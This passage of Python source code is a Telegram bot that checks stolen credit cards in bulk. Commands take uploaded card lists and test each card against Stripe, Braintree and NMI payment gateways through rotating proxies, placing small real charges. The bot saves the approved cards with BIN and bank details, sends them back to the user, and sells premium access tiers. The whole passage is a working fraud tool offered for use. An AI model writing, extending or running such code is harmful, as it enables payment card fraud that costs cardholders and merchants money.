        bot.reply_to(message, bold("Reply to .txt file with") + " /mst", parse_mode="HTML")
        return
    file_info = bot.get_file(message.reply_to_message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    ccs = downloaded_file.decode('utf-8').splitlines()
    ccs = list(dict.fromkeys([l.split('#')[0].strip() for l in ccs if l.strip()]))
    limit = ADMIN_LIMIT
    if len(ccs) > limit:
        bot.reply_to(message, f"{bold('Found')} {len(ccs)} {bold('CCs. Processing first')} {limit}", parse_mode="HTML")
        ccs = ccs[:limit]
    job_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:8].upper()
    ACTIVE_JOBS[job_id] = True
    ACTIVE_USERS_MPP[user_id] = True
    USER_ACTIVE_JOB[user_id] = job_id
    total = len(ccs)
    results = {"approved": 0, "3ds": 0, "declined": 0, "error": 0, "checked": 0}
    approved_list = []
    update_lock = threading.Lock()
    start_time = time.time()

    mk = telebot.types.InlineKeyboardMarkup(row_width=1)
    mk.add(telebot.types.InlineKeyboardButton("𝐒𝐓𝐎𝐏", callback_data=f"stop_{job_id}"))
    prog_msg = bot.reply_to(message, build_mass_caption("Mass Stripe Auth", results, total, start_time), reply_markup=mk, parse_mode="HTML")

    def worker(cc):
        if not ACTIVE_JOBS.get(job_id): return
        t_single = time.time()
        status, response, brand_auto = "ERROR", "No response", "UNKNOWN"
        for _ in range(MAX_RETRIES):
            proxy_dict = None; p_raw = None
            proxy_dict, p_raw = get_proxy_dict()
            try:
                status, response, brand_auto = check_cc(cc, proxy_dict)
                if status != "ERROR": break
            finally:
                release_proxy(p_raw)
        elapsed_single = str(round(time.time() - t_single, 2))
        with update_lock:
            if status == "APPROVED":
                results["approved"] += 1
                try:
                    s = get_stats(); s["approved"] += 1; save_stats(s)
                except: pass
                with open(APPROVED_FILE, 'a', encoding="utf-8") as f: f.write(f"{cc} - {response}\n")
                approved_list.append(cc)
            elif status == "3DS":
                results["3ds"] += 1
                with open(THREEDS_FILE, 'a', encoding="utf-8") as f: f.write(f"{cc} - {response}\n")
            elif status == "DECLINED": results["declined"] += 1
            else: results["error"] += 1
            results["checked"] += 1
        if status == "APPROVED":
            brand_bin, bank, country, level, type_cc, flag = get_bin_info(cc[:6])
            brand = brand_bin if brand_bin != "UNKNOWN" else brand_auto.title()
            single_res = build_template("Stripe Auth", "sa", status, response, brand, bank, country, level, type_cc, flag, elapsed_single, cc_full=cc)
            try:
                bot.send_message(message.chat.id, single_res, parse_mode="HTML")
            except: pass
        try:
            bot.edit_message_text(build_mass_caption("Mass Stripe Auth", results, total, start_time), message.chat.id, prog_msg.message_id, reply_markup=mk, parse_mode="HTML")
        except: pass
        time.sleep(CARD_DELAY)

    with ThreadPoolExecutor(max_workers=WORKERS) as executor:
        for cc in ccs:
            if not ACTIVE_JOBS.get(job_id): break
            executor.submit(worker, cc)
    ACTIVE_JOBS.pop(job_id, None)
    ACTIVE_USERS_MPP[user_id] = False
    USER_ACTIVE_JOB.pop(user_id, None)
    if approved_list:
        filename = f"stripe_approved_{int(time.time())}.txt"
        with open(filename, 'w', encoding='utf-8') as f:
            f.write("\n".join(approved_list))
        with open(filename, 'rb') as f:
            bot.send_document(message.chat.id, f, caption=f"\u2705 Stripe Auth Approved: {len(approved_list)}")
        os.remove(filename)
    else:
        bot.send_message(message.chat.id, bold("No approved cards found."), parse_mode="HTML")

@bot.message_handler(commands=['mbc'])
def bc_mass(message):
    user_id = message.from_user.id
    if is_banned(user_id):
        bot.reply_to(message, bold("You are banned!"), parse_mode="HTML")
        return
    add_user(user_id)
    if not is_admin(user_id):
        bot.reply_to(message, bold("Only owner can use Mass checks."), parse_mode="HTML")
        return
    if ACTIVE_USERS_MBT.get(user_id):
        bot.reply_to(message, bold("Already running") + " /mbc", parse_mode="HTML")
        return
    if not load_bt_token():
        bot.reply_to(message, bold("Braintree token not set"), parse_mode="HTML")
        return
    if not proxy_list:
        bot.reply_to(message, bold("Please add proxy first with") + " /proxy add", parse_mode="HTML")
        return
    if not message.reply_to_message or not message.reply_to_message.document:
        bot.reply_to(message, bold("Reply to .txt file with") + " /mbc", parse_mode="HTML")
        return
    file_info = bot.get_file(message.reply_to_message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    ccs = downloaded_file.decode('utf-8').splitlines()
    ccs = list(dict.fromkeys([l.split('#')[0].strip() for l in ccs if l.strip()]))
    limit = BT_ADMIN_LIMIT
    if len(ccs) > limit:
        bot.reply_to(message, f"{bold('Found')} {len(ccs)} {bold('CCs. Processing first')} {limit}", parse_mode="HTML")
        ccs = ccs[:limit]
    job_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:8].upper()
    ACTIVE_JOBS[job_id] = True
    ACTIVE_USERS_MBT[user_id] = True
    USER_ACTIVE_JOB[user_id] = job_id
    total = len(ccs)
    results = {"charged": 0, "3ds": 0, "declined": 0, "error": 0, "checked": 0}
    approved_list = []
    update_lock = threading.Lock()
    start_time = time.time()

    mk = telebot.types.InlineKeyboardMarkup(row_width=1)
    mk.add(telebot.types.InlineKeyboardButton("𝐒𝐓𝐎𝐏", callback_data=f"stopbt_{job_id}"))
    prog_msg = bot.reply_to(message, build_mass_caption("Mass Braintree $3.05", results, total, start_time), reply_markup=mk, parse_mode="HTML")

    def worker(cc):
        if not ACTIVE_JOBS.get(job_id): return
        t_single = time.time()
        status, response, brand_auto = "ERROR", "No response", "UNKNOWN"
        for _ in range(MAX_RETRIES):
            proxy_dict = None; p_raw = None
            proxy_dict, p_raw = get_proxy_dict()
            try:
                status, response, brand_auto = check_cc_braintree(cc, proxy_dict)
                if status != "ERROR": break
            finally:
                release_proxy(p_raw)
            time.sleep(2)
        elapsed_single = str(round(time.time() - t_single, 2))
        with update_lock:
            if status == "CHARGED":
                results["charged"] += 1
                try:
                    s = get_stats(); s["bt_charged"] = s.get("bt_charged", 0) + 1; save_stats(s)
                except: pass
                with open(BT_APPROVED, 'a', encoding="utf-8") as f:
                    f.write(f"{cc} - CHARGED - {response}\n")
                approved_list.append(cc)
            elif status == "3DS":
                results["3ds"] += 1
                with open(BT_3DS, 'a', encoding="utf-8") as f:
                    f.write(f"{cc} - 3DS - {response}\n")
            elif status == "DECLINED": results["declined"] += 1
            else: results["error"] += 1
            results["checked"] += 1
        if status == "CHARGED":
            brand_bin, bank, country, level, type_cc, flag = get_bin_info(cc[:6])
            brand = brand_bin if brand_bin != "UNKNOWN" else str(brand_auto).title()
            single_res = build_template("Braintree Charge", "bc", status, response, brand, bank, country, level, type_cc, flag, elapsed_single, cc_full=cc)
            try:
                bot.send_message(message.chat.id, single_res, parse_mode="HTML")
            except: pass
        try:
            bot.edit_message_text(build_mass_caption("Mass Braintree $3.05", results, total, start_time), message.chat.id, prog_msg.message_id, reply_markup=mk, parse_mode="HTML")
        except: pass
        time.sleep(CARD_DELAY)

    with ThreadPoolExecutor(max_workers=WORKERS) as executor:
        for cc in ccs:
            if not ACTIVE_JOBS.get(job_id): break
            executor.submit(worker, cc)
    ACTIVE_JOBS.pop(job_id, None)
    ACTIVE_USERS_MBT[user_id] = False
    USER_ACTIVE_JOB.pop(user_id, None)
    if approved_list:
        filename = f"braintree_charged_{int(time.time())}.txt"
        with open(filename, 'w', encoding='utf-8') as f:
            f.write("\n".join(approved_list))
        with open(filename, 'rb') as f:
            bot.send_document(message.chat.id, f, caption=f"\u2705 Braintree Charged: {len(approved_list)}")
        os.remove(filename)
    else:
        bot.send_message(message.chat.id, bold("No charged cards found."), parse_mode="HTML")

@bot.message_handler(commands=['mnmi'])
def nmi_mass(message):
    user_id = message.from_user.id
    if is_banned(user_id):
        bot.reply_to(message, bold("You are banned!"), parse_mode="HTML")
        return
    add_user(user_id)
    if not is_admin(user_id):
        bot.reply_to(message, bold("Only owner can use Mass checks."), parse_mode="HTML")
        return
    if ACTIVE_USERS_MNMI.get(user_id):
        bot.reply_to(message, bold("Already running") + " /mnmi", parse_mode="HTML")
        return
    if not proxy_list:
        bot.reply_to(message, bold("Please add proxy first with") + " /proxy add", parse_mode="HTML")
        return
    if not message.reply_to_message or not message.reply_to_message.document:
        bot.reply_to(message, bold("Reply to .txt file with") + " /mnmi", parse_mode="HTML")
        return
    file_info = bot.get_file(message.reply_to_message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    ccs = downloaded_file.decode('utf-8').splitlines()
    ccs = list(dict.fromkeys([l.split('#')[0].strip() for l in ccs if l.strip()]))
    limit = NMI_ADMIN_LIMIT
    if len(ccs) > limit:
        bot.reply_to(message, f"{bold('Found')} {len(ccs)} {bold('CCs. Processing first')} {limit}", parse_mode="HTML")
        ccs = ccs[:limit]
    job_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:8].upper()
    ACTIVE_JOBS[job_id] = True
    ACTIVE_USERS_MNMI[user_id] = True
    USER_ACTIVE_JOB[user_id] = job_id
    total = len(ccs)
    results = {"charged": 0, "declined": 0, "error": 0, "checked": 0}
    approved_list = []
    update_lock = threading.Lock()
    start_time = time.time()

    mk = telebot.types.InlineKeyboardMarkup(row_width=1)
    mk.add(telebot.types.InlineKeyboardButton("𝐒𝐓𝐎𝐏", callback_data=f"stopnmi_{job_id}"))
    prog_msg = bot.reply_to(message, build_mass_caption("Mass NMI \u00a31", results, total, start_time), reply_markup=mk, parse_mode="HTML")

    def worker(cc):
        if not ACTIVE_JOBS.get(job_id): return
        t_single = time.time()
        status, response, brand_auto = "ERROR", "No response", "UNKNOWN"
        for _ in range(MAX_RETRIES):
            proxy_dict = None; p_raw = None
            proxy_dict, p_raw = get_proxy_dict()
            try:
                status, response, brand_auto = check_cc_nmi(cc, proxy_dict)
                if status != "ERROR": break
            finally:
                release_proxy(p_raw)
            time.sleep(2)
        elapsed_single = str(round(time.time() - t_single, 2))
        with update_lock:
            if status == "CHARGED":
                results["charged"] += 1
                try:
                    s = get_stats(); s["nmi_charged"] = s.get("nmi_charged", 0) + 1; save_stats(s)
                except: pass
                with open(NMI_APPROVED, 'a', encoding="utf-8") as f:
                    f.write(f"{cc} - CHARGED - {response}\n")
                approved_list.append(cc)
            elif status == "DECLINED":
                results["declined"] += 1
                try:
                    s = get_stats(); s["nmi_declined"] = s.get("nmi_declined", 0) + 1; save_stats(s)
                except: pass
                with open(NMI_DECLINED, 'a', encoding="utf-8") as f:
                    f.write(f"{cc} - DECLINED - {response}\n")
            elif status == "3DS":
                with open(NMI_3DS, 'a', encoding="utf-8") as f:
                    f.write(f"{cc} - 3DS - {response}\n")
            else:
                results["error"] += 1
            results["checked"] += 1
        if status == "CHARGED":
            brand_bin, bank, country, level, type_cc, flag = get_bin_info(cc[:6])
            brand = brand_bin if brand_bin != "UNKNOWN" else str(brand_auto).title()
            single_res = build_template("NMI Charge", "nmi", status, response, brand, bank, country, level, type_cc, flag, elapsed_single, cc_full=cc)
            try:
                bot.send_message(message.chat.id, single_res, parse_mode="HTML")
            except: pass
        try:
            bot.edit_message_text(build_mass_caption("Mass NMI \u00a31", results, total, start_time), message.chat.id, prog_msg.message_id, reply_markup=mk, parse_mode="HTML")
        except: pass
        time.sleep(CARD_DELAY)

    with ThreadPoolExecutor(max_workers=NMI_WORKERS) as executor:
        for cc in ccs:
            if not ACTIVE_JOBS.get(job_id): break
            executor.submit(worker, cc)
    ACTIVE_JOBS.pop(job_id, None)
    ACTIVE_USERS_MNMI[user_id] = False
    USER_ACTIVE_JOB.pop(user_id, None)
    if approved_list:
        filename = f"nmi_charged_{int(time.time())}.txt"
        with open(filename, 'w', encoding='utf-8') as f:
            f.write("\n".join(approved_list))
        with open(filename, 'rb') as f:
            bot.send_document(message.chat.id, f, caption=f"\u2705 NMI Charged: {len(approved_list)}")
        os.remove(filename)
    else:
        bot.send_message(message.chat.id, bold("No charged cards found."), parse_mode="HTML")

@bot.callback_query_handler(func=lambda c: c.data.startswith("stopbt_"))
def cb_stop_bt(call):
    try: bot.answer_callback_query(call.id, "Stopping...")
    except: pass
    jid = call.data[7:]
    uid = call.from_user.id
    if jid in ACTIVE_JOBS:
        ACTIVE_JOBS[jid] = False
        if USER_ACTIVE_JOB.get(uid) == jid:
            USER_ACTIVE_JOB.pop(uid, None)

@bot.callback_query_handler(func=lambda c: c.data.startswith("stop_"))
def cb_stop(call):
    try: bot.answer_callback_query(call.id, "Stopping...")
    except: pass
    jid = call.data[5:]
    uid = call.from_user.id
    if jid in ACTIVE_JOBS:
        ACTIVE_JOBS[jid] = False
        if USER_ACTIVE_JOB.get(uid) == jid:
            USER_ACTIVE_JOB.pop(uid, None)

@bot.callback_query_handler(func=lambda c: c.data.startswith("stopnmi_"))
def cb_stop_nmi(call):
    try: bot.answer_callback_query(call.id, "Stopping...")
    except: pass
    jid = call.data[8:]
    uid = call.from_user.id
    if jid in ACTIVE_JOBS:
        ACTIVE_JOBS[jid] = False
        if USER_ACTIVE_JOB.get(uid) == jid:
            USER_ACTIVE_JOB.pop(uid, None)

@bot.message_handler(commands=['setbttoken'])
def set_bt_token(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, bold("Admin only"), parse_mode="HTML")
        return
    try:
        token = message.text.split(maxsplit=1)[1].strip()
        if not token.startswith("eyJ"):
            bot.reply_to(message, bold("Invalid JWT"), parse_mode="HTML")
            return
        save_bt_token(token)
        rem = token_remaining_seconds(token)
        mins = rem // 60
        bot.reply_to(message, f"{bold('Braintree token saved. Remaining')}: {mins} {bold('minutes')}", parse_mode="HTML")
    except:
        bot.reply_to(message, bold("Usage:") + " /setbttoken <JWT>", parse_mode="HTML")

@bot.message_handler(commands=['btinfo'])
def bt_info(message):
    token = load_bt_token()
    if not token:
        bot.reply_to(message, bold("No Braintree token set"), parse_mode="HTML")
        return
    rem = token_remaining_seconds(token)
    if rem < 0:
        bot.reply_to(message, bold("Braintree token invalid or expired"), parse_mode="HTML")
        return
    hrs = rem // 3600
    mins = (rem % 3600) // 60
    bot.reply_to(message, f"{bold('Braintree Token')}: {hrs}h {mins}m {bold('remaining')}", parse_mode="HTML")

@bot.message_handler(commands=['addpremium'])
def add_prem(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, bold("Admin only"), parse_mode="HTML")
        return
    try:
        parts = message.text.split()
        target_id = parts[1]
        duration = parts[2]
        now = time.time()
        if duration == 'lifetime': exp = 0
        elif duration.endswith('s'): exp = now + int(duration[:-1])
        elif duration.endswith('m'): exp = now + int(duration[:-1]) * 60
        elif duration.endswith('h'): exp = now + int(duration[:-1]) * 3600
        elif duration.endswith('d'): exp = now + int(duration[:-1]) * 86400
        else: raise Exception()
        with open(PREMIUM_FILE, 'a') as f:
            f.write(f"{target_id}|{exp}\n")
        bot.reply_to(message, f"{bold('Premium added')}: {target_id}", parse_mode="HTML")
    except:
        bot.reply_to(message, bold("Usage:") + " /addpremium <userid> <duration>", parse_mode="HTML")

@bot.message_handler(commands=['rmpremium'])
def rm_prem(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, bold("Admin only"), parse_mode="HTML")
        return
    try:
        target_id = message.text.split()[1]
        with open(PREMIUM_FILE, 'r') as f: lines = f.readlines()
        with open(PREMIUM_FILE, 'w') as f:
            for l in lines:
                if target_id not in l: f.write(l)
        bot.reply_to(message, f"{bold('Premium removed')}: {target_id}", parse_mode="HTML")
    except:
        bot.reply_to(message, bold("Usage:") + " /rmpremium <userid>", parse_mode="HTML")

@bot.message_handler(commands=['ban'])
def ban_user(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, bold("Admin only"), parse_mode="HTML")
        return
    try:
        parts = message.text.split()
        target_id = parts[1]
        duration = parts[2] if len(parts) > 2 else 'lifetime'
        now = time.time()
        if duration == 'lifetime': exp = 0
        elif duration.endswith('s'): exp = now + int(duration[:-1])
        elif duration.endswith('m'): exp = now + int(duration[:-1]) * 60
        elif duration.endswith('h'): exp = now + int(duration[:-1]) * 3600
        elif duration.endswith('d'): exp = now + int(duration[:-1]) * 86400
        else: raise Exception()
        with open(BANNED_FILE, 'a') as f:
            f.write(f"{target_id}|{exp}\n")
        bot.reply_to(message, f"{bold('Banned')}: {target_id}", parse_mode="HTML")
    except:
        bot.reply_to(message, bold("Usage:") + " /ban <userid> <duration>", parse_mode="HTML")

@bot.message_handler(commands=['unban'])
def unban_user(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, bold("Admin only"), parse_mode="HTML")
        return
    try:
        target_id = message.text.split()[1]
        with open(BANNED_FILE, 'r') as f: lines = f.readlines()
        with open(BANNED_FILE, 'w') as f:
            for l in lines:
                if target_id not in l: f.write(l)
        bot.reply_to(message, f"{bold('Unbanned')}: {target_id}", parse_mode="HTML")
    except:
        bot.reply_to(message, bold("Usage:") + " /unban <userid>", parse_mode="HTML")

@bot.message_handler(commands=['info'])
def user_info(message):
    target_id = str(message.from_user.id)
    role = "[FREE]"; limit = FREE_LIMIT
    if is_admin(int(target_id)): role = f"[{bold('ADMIN')}]"; limit = ADMIN_LIMIT
    elif is_premium(int(target_id)): role = f"[{bold('PREMIUM')}]"; limit = PREMIUM_LIMIT
    else: role = f"[{bold('FREE')}]"
    used, daily, reset_in, _ = get_user_limit(int(target_id))
    daily_text = bold("Unlimited") if daily == 0 else f"{daily}"
    bot.reply_to(message, f"{bold('User ID')}: {target_id}\n{bold('Rank')}: {role}\n{bold('Mass Limit')}: {limit}\n{bold('Daily Checks')}: {used}/{daily_text}", parse_mode="HTML")

@bot.message_handler(commands=['stats'])
def bot_stats(message):
    if not is_admin(message.from_user.id):
        bot.reply_to(message, bold("Admin only"), parse_mode="HTML")
        return
    s = get_stats()
    bot.reply_to(message, f"{bold('Stripe Approved')}: {s.get('approved', 0)}\n{bold('Stripe 3DS')}: {s.get('3ds', 0)}\n{bold('Braintree Charged')}: {s.get('bt_charged', 0)}\n{bold('Braintree 3DS')}: {s.get('bt_3ds', 0)}\n{bold('NMI Charged')}: {s.get('nmi_charged', 0)}\n{bold('NMI Declined')}: {s.get('nmi_declined', 0)}\n{bold('Total Users')}: {s.get('total_users', 0)}", parse_mode="HTML")

if __name__ == "__main__":
    print("BOT IS RUNNING...")
    while True:
        try:
            bot.polling(none_stop=True, timeout=60)
        except:
            time.sleep(5)
